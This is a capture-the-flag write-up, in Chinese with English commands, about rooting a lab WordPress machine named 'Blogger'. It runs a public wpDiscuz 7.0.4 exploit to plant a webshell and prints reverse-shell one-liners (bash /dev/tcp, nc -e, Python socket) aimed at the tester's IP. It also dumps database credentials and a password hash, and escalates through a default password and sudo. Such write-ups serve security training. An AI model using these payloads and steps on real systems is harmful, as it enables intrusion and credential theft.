# Blogger
![image](https://hackmd.io/_uploads/Hyd8as82kg.png)

## Solution
### 1. Recon
#### 1.1 Nmap
```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -T4 192.168.117.217
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 04:22 EDT
Nmap scan report for 192.168.117.217
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Blogger | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.54 seconds

```
確認 SSH 允許的驗證方式
```
┌──(chw㉿CHW)-[~]
└─$ nmap --script ssh-auth-methods -p22 192.168.117.217

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 04:23 EDT

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|_    publickey

Nmap done: 1 IP address (1 host up) scanned in 1.08 seconds
```
> 只允許 publickey，無法使用密碼破解

#### 1.2 dirsearch
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://192.168.117.217
...
[04:50:33] 301 -  319B  - /assets  ->  http://192.168.117.217/assets/       
[04:50:33] 200 -  475B  - /assets/
[04:50:45] 301 -  316B  - /css  ->  http://192.168.117.217/css/             
[04:50:57] 301 -  319B  - /images  ->  http://192.168.117.217/images/       
[04:50:57] 200 -  693B  - /images/                                          
[04:51:01] 200 -  603B  - /js/  
```
#### 1.3 瀏覽 /assets/
![image](https://hackmd.io/_uploads/SywTHh8nJg.png)
內文嵌入很多 http://blogger.pg/... 的路徑\
![image](https://hackmd.io/_uploads/BJO9I3U2kg.png)
> 但無法瀏覽

#### 1.4 /ect/host
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts      
192.168.117.217 blogger.pg
```
再次瀏覽 http://blogger.pg/assets/fonts/blog/wp-includes/\
![image](https://hackmd.io/_uploads/SJTovh82kl.png)
> Wordpress

找到 wordpress login 介面\
http://blogger.pg/assets/fonts/blog/wp-login.php\
![image](https://hackmd.io/_uploads/rJaxF2U3ke.png)

#### 1.5 Wpscan
```
┌──(chw㉿CHW)-[~]
└─$ wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate p --plugins-detection aggressive 
...
[+] akismet
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2025-02-14T18:49:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.3.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2025-02-20T16:52:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.28
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
```
> 找到兩個過期 plugin: `akismet` 與 `wpdiscuz`

### 2. searchsploit
#### 2.1 akismet
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit akismet      
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                                                              | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                                                 | php/webapps/30036.html
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
> 版本不符
#### 2.2 wpdiscuz
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit wpdiscuz
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                             | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                             | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasploit)                                                  | php/webapps/49401.rb
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
> 三個 exploit 版本都符合

### 3. Exploit
#### 3.1 嘗試 `49967.py`: CVE-2020-24186
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 49967
┌──(chw㉿CHW)-[~]
└─$ searchsploit -m 49967
```
需要上傳路徑: `http://blogger.pg/assets/fonts/blog/?p=29`\
透過留言區
```
┌──(chw㉿CHW)-[~]
└─$ python3 49967.py -u http://blogger.pg/assets/fonts/blog/ -p ./?p=29
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[59354] | code:[200]
[!] Got wmuSecurity value: 444df237a3
[!] Got wmuSecurity value: 29 

[+] Generating random name for Webshell...
[!] Generated webshell name: oywknkrctpnlpmt

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/03/oywknkrctpnlpmt-1742290432.2863.php&quot; 

> id

[x] Failed to execute PHP code...
```
> 執行失敗，但他給了 Webshell 路徑\
> 嘗試瀏覽

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2025/03/abbfeiyqkffmvqv-1742290331.3557.php?cmd=ls\
![image](https://hackmd.io/_uploads/rk8U03Ihyx.png)
> 可行\
> 嘗試塞入 Reverse Shell
#### 3.2 Reverse Shell
先測試 Server 能否連線到 Kali\
`cmd=curl -v http://192.168.45.214`
```
┌──(chw㉿CHW)-[~]
└─$ python3 -m http.server 80              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.117.217 - - [18/Mar/2025 05:41:37] "GET / HTTP/1.1" 200 -

```
嘗試以下 
```
/bin/bash -i >& /dev/tcp/192.168.45.214/8888 0>&1
nc -e /bin/sh 192.168.45.214 8888
```
>都不可行，猜測是 Webshell 執行完後立即終止

嘗試 python import socket
```
?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.214",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

#若環境沒有 python3 ，可嘗試 python2:
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.214",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
> 成功

```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.117.217] 55592
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
www-data
$ cd /
$ ls
...     
$ ls /home
james
ubuntu
vagrant
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /etc/shadow
cat: /etc/shadow: Permission denied
$ grep "CRON" /var/log/syslog
grep: /var/log/syslog: Permission denied
```
> `www-data` 權限很小

### ✅ Get User Flag
> 在 `/home/james`找到 User flag
## Privileges Escalation
### 4. LinPEAS
```
┌──(chw㉿CHW)-[/]
└─$ which linpeas
/usr/bin/linpeas

┌──(chw㉿CHW)-[/]
└─$ cp /usr/bin/linpeas /home/chw/Desktop/upload_file 

┌──(chw㉿CHW)-[/]
└─$ cd /home/chw/Desktop/upload_file

┌──(chw㉿CHW)-[~/Desktop/upload_file/linpeas]
└─$ python3 -m http.server 80                                          
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
$ bash -i
www-data@ubuntu-xenial:/$ cd /tmp
cd /tmp
www-data@ubuntu-xenial:/tmp$ wget http://192.168.45.214/linpeas.sh
www-data@ubuntu-xenial:/tmp$ chmod +x linpeas.sh
www-data@ubuntu-xenial:/tmp$ ./linpeas.sh
...
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data root 2878 Jan 17  2021 /var/www/wordpress/assets/fonts/blog/wp-config.php                                                           
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
define('DB_HOST', 'localhost');

```
### 5. Mysql 
```
www-data@ubuntu-xenial:/$ mysql -u root -p'sup3r_s3cr3t'
mysql -u root -p'sup3r_s3cr3t'
show databases
;
exit
Database
information_schema
mysql
performance_schema
wordpress
www-data@ubuntu-xenial:/$ mysql -u root -p'sup3r_s3cr3t'
mysql -u root -p'sup3r_s3cr3t'
use wordpress;
show tables;
exit
Tables_in_wordpress
wp_commentmeta
wp_comments
wp_links
wp_options
wp_postmeta
wp_posts
wp_term_relationships
wp_term_taxonomy
wp_termmeta
wp_terms
wp_usermeta
wp_users
wp_wc_avatars_cache
wp_wc_comments_subscription
wp_wc_feedback_forms
wp_wc_follow_users
wp_wc_phrases
wp_wc_users_rated
wp_wc_users_voted
www-data@ubuntu-xenial:/$ mysql -u root -p'sup3r_s3cr3t'
mysql -u root -p'sup3r_s3cr3t'
use wordpress;
select * from wp_users;
exit
ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status       display_name
1       j@m3s   $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/      jm3s    admin@blogger.thm               2021-01-17 12:40:06             0       j@m3s
www-data@ubuntu-xenial:/$
```
> 不知道為什要 exit; 才會顯示\
> 總之拿到 Hash

### 5. Hashcat
```
┌──(chw㉿CHW)-[~]
└─$ hashid '$P$BqG2S/yf1TNEu03lHunJLawBEzKQZv' -m
Analyzing '$P$BqG2S/yf1TNEu03lHunJLawBEzKQZv'
[+] Juniper Netscreen/SSG(ScreenOS) [Hashcat Mode: 22]

┌──(chw㉿CHW)-[~]
└─$ hashcat -m 22 oscp.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
> 沒有結果

### 6. 預設密碼
結果 vagrant 使用預設密碼
```
www-data@ubuntu-xenial:/$ su vargrant
su vargrant
su: must be run from a terminal
www-data@ubuntu-xenial:/home/vagrant$ script -qc "/bin/su vagrant" /dev/null
script -qc "/bin/su vagrant" /dev/null
Password: vagrant

vagrant@ubuntu-xenial:~$ 
```
### 7. sudo -l
```
vagrant@ubuntu-xenial:~$ sudo -l
sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
vagrant@ubuntu-xenial:~$ sudo -i
sudo -i
root@ubuntu-xenial:~# whoami
whoami
root
root@ubuntu-xenial:~# ls /root  
ls /root
proof.txt
root@ubuntu-xenial:~# cat /root/proof.txt
cat /root/proof.txt
```
### ✅ Get Root FLAG
